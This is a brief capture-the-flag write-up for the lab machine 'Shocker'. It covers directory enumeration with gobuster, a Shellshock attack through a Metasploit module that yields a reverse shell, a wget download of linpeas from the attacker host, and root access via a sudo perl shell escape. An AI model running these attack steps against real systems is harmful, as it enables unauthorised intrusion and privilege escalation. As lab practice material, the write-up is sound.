OpenSSH 7.2p2: there is an username enumeration exploit for this openssh service
^ I couldn't get any where with this.

gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/big.txt
=> Gobuster shows there is a /cgi-bin/

Check inside /cgi-bin/ for files with sh and php extensions
gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/big.txt -x php,sh
We got user.sh

nothing interesting much about this script!?

Some googling -> seems like this is a shellshock RCE vulnerability

Found a metasploit module for this exploit
auxiliary/scanner/http/apache_mod_cgi_bash_env -> however, this only execute 1 commands at a time, a tcp reverse shell is preferred
exploit/multi/http/apache_mod_cgi_bash_env_exec -> that's more like it

Configure: rhosts, targeturi as /cgi-bin/user.sh, lhost and lport
Got a meterpreter shell:
Proper shell -> python3 -c 'import pty;pty.spawn("/bin/bash")'

whoami -> shelly -> user.txt pwned

Prives:
Get linpeas.sh:
Host: python3 http.server 9999
shelly@shocker: wget 10.10.14.29:9999/linpeas.sh

From the script, 2 obvious thing to pick up here is lxd vulnerability and shelly can run /usr/bin/perl as root.
Let's take the easy way out: sudo /usr/bin/perl -e 'system("/bin/bash")'
whoami -> root
root.txt pwned
